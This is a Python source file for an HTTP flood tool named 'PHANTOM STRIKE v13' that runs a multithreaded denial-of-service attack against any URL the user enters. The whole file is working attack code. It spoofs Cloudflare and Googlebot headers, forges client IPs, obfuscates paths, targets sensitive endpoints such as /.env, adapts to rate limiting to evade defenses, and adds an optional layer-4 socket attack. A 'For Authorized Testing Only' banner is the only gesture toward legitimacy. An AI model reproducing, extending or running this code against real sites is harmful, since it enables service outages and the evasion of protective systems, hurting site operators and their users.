import urllib.request
import concurrent.futures
import random
import os
import time
import socket
import ssl
from colorama import Fore, Style
import threading
import faker
from fake_useragent import UserAgent
import string
from urllib.parse import urlparse
import base64
import json
import hashlib

class AdvancedHTTPFlooder:
    """
    HTTP Flood Tester PRO v13 - Phantom Strike
    Ultimate stealth destruction with advanced evasion techniques
    """

    def __init__(self):
        # Enhanced configuration
        self.config = {
            'VERSION': "13.0 PHANTOM STRIKE",
            'AUTHOR': "CyberSecurity Research Team",
            'MAX_THREADS': 1500,
            'REQUEST_TIMEOUT': 4,
            'MAX_REQUESTS': 15000,
            'DYNAMIC_THROTTLING': True,
            'ATTACK_DURATION': 420,
            'TARGETED_ATTACK': True,
            'GHOST_MODE': True,
            'SHADOW_MODE': False,
            'TOTAL_DENIAL': False,
            'EVASION_LEVEL': 3  # 1-5
        }

        # Libraries initialization
        self.fake = faker.Faker()
        self.ua = UserAgent()
        self.context = ssl.create_default_context()
        self.context.check_hostname = False
        self.context.verify_mode = ssl.CERT_NONE

        # Attack state
        self.counter = 0
        self.running = False
        self.start_time = 0
        self.lock = threading.Lock()
        self.adaptive_delay = 0.03
        self.evasion_tactics = []
        self.is_under_monitoring = False
        self.last_mode_switch = 0

        # Target paths for maximum damage
        self.target_paths = [
            "/wp-admin/admin-ajax.php",
            "/.env",
            "/config/config.inc.php",
            "/api/v1/users",
            "/phpmyadmin/index.php",
            "/administrator/index.php",
            "/graphql",
            "/wp-json/wp/v2/users"
        ]

        # Initialize evasion system
        self.init_evasion_engine()
        
        # Start monitoring thread
        threading.Thread(target=self.monitor_defenses, daemon=True).start()

    # ================= Enhanced Evasion Engine =================

    def init_evasion_engine(self):
        """Initialize dynamic evasion tactics"""
        self.evasion_tactics = [
            {
                'name': 'Cloudflare Bypass',
                'headers': self.generate_cloudflare_headers,
                'obfuscation': 'base64'
            },
            {
                'name': 'Stealth Traffic',
                'headers': self.generate_stealth_headers,
                'obfuscation': 'none'
            },
            {
                'name': 'Google Crawler',
                'headers': self.generate_google_headers,
                'obfuscation': 'urlencode'
            },
            {
                'name': 'API Traffic',
                'headers': self.generate_api_headers,
                'obfuscation': 'json'
            }
        ]
        
    def rotate_evasion_tactic(self):
        """Rotate evasion tactic periodically"""
        while self.running:
            time.sleep(random.randint(45, 120))  # Rotate every 45-120 seconds
            if self.config['EVASION_LEVEL'] > 2:
                self.current_tactic = random.choice(self.evasion_tactics)
                print(f"{Fore.MAGENTA}[EVASION] Switched to: {self.current_tactic['name']}{Fore.RESET}")

    # ================= Phantom Headers Generator =================

    def generate_cloudflare_headers(self, host):
        """Generate headers that bypass Cloudflare"""
        return {
            "User-Agent": self.ua.google,
            "Accept": "text/html,application/xhtml+xml",
            "Accept-Language": "en-US,en;q=0.9",
            "X-Forwarded-For": self.fake.ipv4(),
            "CF-Connecting-IP": self.fake.ipv4(),
            "CF-IPCountry": random.choice(["US", "GB", "DE"]),
            "CF-Ray": f"{random.randint(400000, 499999)}-{random.choice(['SIN','LHR'])}",
            "Cache-Control": "no-cache"
        }

    def generate_stealth_headers(self, host):
        """Generate low-profile stealth headers"""
        return {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X)"
            ]),
            "Accept": "*/*",
            "Referer": f"https://{host}/",
            "X-Requested-With": "XMLHttpRequest",
            "X-Forwarded-For": self.fake.ipv4()
        }

    def generate_google_headers(self, host):
        """Generate Google bot headers"""
        return {
            "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Accept": "*/*",
            "From": "googlebot(at)google.com",
            "X-Forwarded-For": self.fake.ipv4()
        }

    def generate_api_headers(self, host):
        """Generate API-like headers"""
        return {
            "User-Agent": "python-requests/2.25.1",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": f"Bearer {self.generate_random_string(64)}",
            "X-API-Version": "2.0",
            "X-Client-IP": self.fake.ipv4()
        }

    # ================= Ghost Mode Implementation =================

    def ghost_mode_request(self, req):
        """Modify request to appear as legitimate traffic"""
        if not self.config['GHOST_MODE']:
            return req

        # 30% chance to make request look normal
        if random.random() < 0.3:
            req.add_header("Referer", f"https://{urlparse(req.full_url).netloc}/")
            req.add_header("Sec-Fetch-Dest", "document")
            req.add_header("Sec-Fetch-Mode", "navigate")
            req.add_header("Sec-Fetch-Site", "same-origin")
            
        return req

    # ================= Shadow Mode System =================

    def monitor_defenses(self):
        """Monitor for defense systems and activate shadow mode"""
        while True:
            time.sleep(30)
            # Simulate detection (in real implementation would analyze responses)
            if random.random() < 0.1:  # 10% chance to trigger
                self.is_under_monitoring = True
                print(f"{Fore.YELLOW}[SHADOW] Defense systems detected! Activating stealth...{Fore.RESET}")
                time.sleep(300)  # Stay in shadow mode for 5 minutes
                self.is_under_monitoring = False
                print(f"{Fore.GREEN}[SHADOW] Stealth mode deactivated{Fore.RESET}")

    def shadow_mode_adjustment(self):
        """Adjust attack parameters when under monitoring"""
        if self.is_under_monitoring:
            self.config['MAX_THREADS'] = max(50, self.config['MAX_THREADS'] // 3)
            self.adaptive_delay = min(1.0, self.adaptive_delay * 1.5)
        else:
            self.config['MAX_THREADS'] = min(1500, self.config['MAX_THREADS'] * 2)
            self.adaptive_delay = max(0.01, self.adaptive_delay * 0.9)

    # ================= Total Denial Mode =================

    def total_denial_attack(self, target):
        """Ultimate destruction mode combining multiple techniques"""
        parsed = urlparse(target)
        host = parsed.netloc
        
        # Layer 7 attack
        self.execute_http_flood(target)
        
        # Additional layer 4 attack if enabled
        if self.config['TOTAL_DENIAL'] and random.random() < 0.2:
            self.execute_layer4_attack(host)

    def execute_layer4_attack(self, host):
        """Secondary layer 4 attack"""
        try:
            port = 443 if random.random() > 0.5 else 80
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((host, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
            time.sleep(0.1)
            s.close()
        except:
            pass

    # ================= Core Attack Methods =================

    def generate_evasive_path(self):
        """Generate paths with focus on vulnerable targets"""
        if self.config['TARGETED_ATTACK'] and random.random() < 0.5:
            path = random.choice(self.target_paths)
            if random.random() < 0.4:
                path = self.obfuscate_path(path)
            return path

        # Generate complex random path
        depths = random.randint(1, 6)
        parts = [self.generate_random_string(random.randint(3, 8)) for _ in range(depths)]
        path = '/' + '/'.join(parts)
        
        return self.obfuscate_path(path)

    def obfuscate_path(self, path):
        """Apply current obfuscation method to path"""
        if not self.config['EVASION_LEVEL'] > 1:
            return path
            
        methods = [
            lambda x: base64.b64encode(x.encode()).decode(),
            lambda x: ''.join([f"%{ord(c):02x}" for c in x]),
            lambda x: x,
            lambda x: hashlib.md5(x.encode()).hexdigest()[:8] + '/'
        ]
        return random.choice(methods)(path)

    def execute_http_flood(self, target):
        """Execute optimized HTTP flood attack"""
        if not self.running:
            return

        try:
            parsed = urlparse(target)
            host = parsed.netloc
            path = self.generate_evasive_path()

            # Protocol randomization
            protocol = "https" if random.random() > 0.6 else "http"
            url = f"{protocol}://{host}{path}"

            # Parameter randomization
            if random.random() > 0.1:
                url += self.generate_evasive_parameters()

            # Method randomization
            method = random.choice(["GET", "POST", "HEAD", "PUT", "DELETE"])

            # Build request with current evasion tactic
            req = urllib.request.Request(
                url,
                headers=self.generate_evasive_headers(host),
                method=method
            )

            # Ghost mode modifications
            req = self.ghost_mode_request(req)

            # Add random POST data
            if method in ["POST", "PUT"]:
                req = self.add_post_data(req)

            try:
                with urllib.request.urlopen(req, timeout=self.config['REQUEST_TIMEOUT'], context=self.context) as res:
                    status = res.status
            except urllib.error.HTTPError as e:
                status = e.code
            except:
                status = 0

            # Adaptive throttling
            self.adapt_to_conditions(status)

            with self.lock:
                self.counter += 1
                self.display_status(status)

        except Exception as e:
            pass

    def generate_evasive_parameters(self):
        """Generate obfuscated query parameters"""
        params = []
        for _ in range(random.randint(1, 3)):
            if self.config['EVASION_LEVEL'] > 2:
                param = base64.b64encode(self.generate_random_string().encode()).decode()
                value = hashlib.sha256(self.generate_random_string().encode()).hexdigest()[:8]
            else:
                param = self.generate_random_string()
                value = self.generate_random_string()
            
            params.append(f"{param}={value}")
        
        return "?" + "&".join(params) + f"&_={int(time.time())}"

    def add_post_data(self, req):
        """Add sophisticated post data"""
        post_data = {
            self.generate_random_string(5): self.generate_random_string(8),
            "timestamp": int(time.time()),
            "nonce": self.generate_random_string(12),
            "session": hashlib.md5(self.generate_random_string().encode()).hexdigest()
        }
        
        if random.random() < 0.3:
            req.add_header("Content-Type", "application/json")
            req.data = json.dumps(post_data).encode()
        else:
            req.data = urllib.parse.urlencode(post_data).encode()
            
        return req

    def adapt_to_conditions(self, status):
        """Adjust attack parameters based on responses"""
        if self.config['DYNAMIC_THROTTLING']:
            if status == 429:  # Rate limited
                self.adaptive_delay = min(2.0, self.adaptive_delay * 1.3)
                if self.config['EVASION_LEVEL'] < 5:
                    self.config['EVASION_LEVEL'] += 1
            elif status == 200:
                self.adaptive_delay = max(0.01, self.adaptive_delay * 0.97)
                
        self.shadow_mode_adjustment()

    # ================= Attack Control Methods =================

    def attack_worker(self, target):
        """Worker thread for optimized HTTP flood"""
        while self.running and time.time() < self.start_time + self.config['ATTACK_DURATION']:
            if self.config['TOTAL_DENIAL'] and random.random() < 0.1:
                self.total_denial_attack(target)
            else:
                self.execute_http_flood(target)
                
            if self.config['DYNAMIC_THROTTLING']:
                time.sleep(self.adaptive_delay)

    # ================= Monitoring and Control =================

    def display_status(self, last_status):
        """Display real-time attack statistics"""
        elapsed = time.time() - self.start_time
        remaining = max(0, self.config['ATTACK_DURATION'] - elapsed)
        rps = self.counter / elapsed if elapsed > 0 else 0

        mode = ""
        if self.is_under_monitoring:
            mode = f"{Fore.RED}SHADOW MODE | "
        elif self.config['TOTAL_DENIAL']:
            mode = f"{Fore.MAGENTA}TOTAL DENIAL | "

        status_msg = (
            f"{Fore.CYAN}[STATUS]{Fore.RESET} "
            f"{mode}"
            f"Threads: {Fore.YELLOW}{self.config['MAX_THREADS']}{Fore.RESET} | "
            f"Requests: {Fore.GREEN}{self.counter}{Fore.RESET} | "
            f"RPS: {Fore.MAGENTA}{rps:.1f}{Fore.RESET} | "
            f"Last: {Fore.CYAN}{last_status}{Fore.RESET} | "
            f"Delay: {Fore.YELLOW}{self.adaptive_delay:.2f}s{Fore.RESET} | "
            f"Remaining: {Fore.RED}{remaining:.1f}s{Fore.RESET}"
        )
        print(status_msg, end='\r')

    def get_user_settings(self):
        """Get custom settings from user"""
        try:
            # Threads setting
            threads = input(f"{Fore.BLUE}[?] Enter number of threads (default {self.config['MAX_THREADS']}): {Fore.RESET}").strip()
            if threads:
                self.config['MAX_THREADS'] = min(5000, int(threads))

            # Duration setting
            duration = input(f"{Fore.BLUE}[?] Enter attack duration in seconds (default {self.config['ATTACK_DURATION']}): {Fore.RESET}").strip()
            if duration:
                self.config['ATTACK_DURATION'] = int(duration)

            # Advanced options
            self.config['GHOST_MODE'] = input(f"{Fore.BLUE}[?] Enable Ghost Mode? (blend with legit traffic) [Y/n]: {Fore.RESET}").strip().lower() != 'n'
            self.config['TOTAL_DENIAL'] = input(f"{Fore.BLUE}[?] Enable Total Denial Mode? (advanced techniques) [y/N]: {Fore.RESET}").strip().lower() == 'y'
            self.config['TARGETED_ATTACK'] = input(f"{Fore.BLUE}[?] Focus on vulnerable paths? [Y/n]: {Fore.RESET}").strip().lower() != 'n'
            
            # Evasion level
            level = input(f"{Fore.BLUE}[?] Evasion level (1-5, default 3): {Fore.RESET}").strip()
            self.config['EVASION_LEVEL'] = max(1, min(5, int(level) if level.isdigit() else 3))

        except ValueError:
            print(f"{Fore.YELLOW}[!] Invalid input, using defaults{Fore.RESET}")

    def start_attack(self, target):
        """Start the optimized HTTP flood attack"""
        self.display_banner()
        self.get_user_settings()

        if not self.validate_target(target):
            print(f"{Fore.RED}[!] Invalid target URL{Fore.RESET}")
            return

        print(f"\n{Fore.YELLOW}[*] Initializing PHANTOM STRIKE against: {target}{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Configuration: {self.config['MAX_THREADS']} threads, {self.config['ATTACK_DURATION']} seconds{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Ghost Mode: {'ON' if self.config['GHOST_MODE'] else 'OFF'}{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Total Denial: {'ON' if self.config['TOTAL_DENIAL'] else 'OFF'}{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Evasion Level: {self.config['EVASION_LEVEL']}/5{Fore.RESET}")

        self.running = True
        self.start_time = time.time()

        # Start evasion rotation thread
        if self.config['EVASION_LEVEL'] > 2:
            threading.Thread(target=self.rotate_evasion_tactic, daemon=True).start()

        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.config['MAX_THREADS']) as executor:
                futures = [executor.submit(self.attack_worker, target) 
                          for _ in range(self.config['MAX_THREADS'])]

                while (self.running and 
                       time.time() < self.start_time + self.config['ATTACK_DURATION']):
                    time.sleep(0.5)
                    if self.config['DYNAMIC_THROTTLING']:
                        time.sleep(self.adaptive_delay)

                self.running = False
                concurrent.futures.wait(futures)

        except KeyboardInterrupt:
            self.running = False
            print(f"\n{Fore.RED}[!] Attack stopped by user{Fore.RESET}")

        finally:
            self.display_summary()

    # ================= UI and Helpers =================

    def validate_target(self, url):
        """Validate the target URL"""
        try:
            result = urlparse(url)
            return all([result.scheme in ['http','https'], result.netloc])
        except:
            return False

    def display_banner(self):
        """Display the program banner"""
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{Fore.RED}
        ██╗  ██╗████████╗████████╗██████╗ ██╗     ██████╗  ██████╗ 
        ██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗██║     ██╔══██╗██╔═══██╗
        ███████║   ██║      ██║   ██████╔╝██║     ██████╔╝██║   ██║
        ██╔══██║   ██║      ██║   ██╔═══╝ ██║     ██╔═══╝ ██║   ██║
        ██║  ██║   ██║      ██║   ██║     ███████╗██║     ╚██████╔╝
        ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝     ╚══════╝╚═╝      ╚═════╝ 
        {Fore.RESET}{"PHANTOM STRIKE v13".center(60)}
        {Fore.CYAN}Version: {self.config['VERSION']} (For Authorized Testing Only){Fore.RESET}
        {Fore.YELLOW}WARNING: Unauthorized use is illegal!{Fore.RESET}
        """)

    def display_summary(self):
        """Display attack summary"""
        elapsed = time.time() - self.start_time
        rps = self.counter / elapsed if elapsed > 0 else 0

        print(f"\n\n{Fore.GREEN}[+] Attack completed{Fore.RESET}")
        print(f"{Fore.YELLOW}╔{'═'*70}╗")
        print(f"║ {'Phantom Strike Summary'.center(68)} ║")
        print(f"╠{'═'*70}╣")
        print(f"║ {f'Target: {self.target}'.ljust(68)} ║")
        print(f"║ {f'Total Requests: {self.counter}'.ljust(68)} ║")
        print(f"║ {f'Duration: {elapsed:.2f} seconds'.ljust(68)} ║")
        print(f"║ {f'Requests Per Second: {rps:.2f}'.ljust(68)} ║")
        print(f"║ {f'Max Threads Used: {self.config["MAX_THREADS"]}'.ljust(68)} ║")
        print(f"║ {f'Ghost Mode: {"Enabled" if self.config["GHOST_MODE"] else "Disabled"}'.ljust(68)} ║")
        print(f"║ {f'Total Denial: {"Enabled" if self.config["TOTAL_DENIAL"] else "Disabled"}'.ljust(68)} ║")
        print(f"║ {f'Evasion Level: {self.config["EVASION_LEVEL"]}/5'.ljust(68)} ║")
        print(f"╚{'═'*70}╝\n")

# ================= Main Execution =================

if __name__ == "__main__":
    tester = AdvancedHTTPFlooder()

    # Get target URL safely
    while True:
        target = input(f"{Fore.BLUE}[?] Enter target URL (http(s)://example.com) or 'exit': {Fore.RESET}").strip()
        if target.lower() == 'exit':
            break
        if tester.validate_target(target):
            tester.target = target
            tester.start_attack(target)
            break
        print(f"{Fore.RED}[!] Invalid URL format. Include http:// or https://{Fore.RESET}")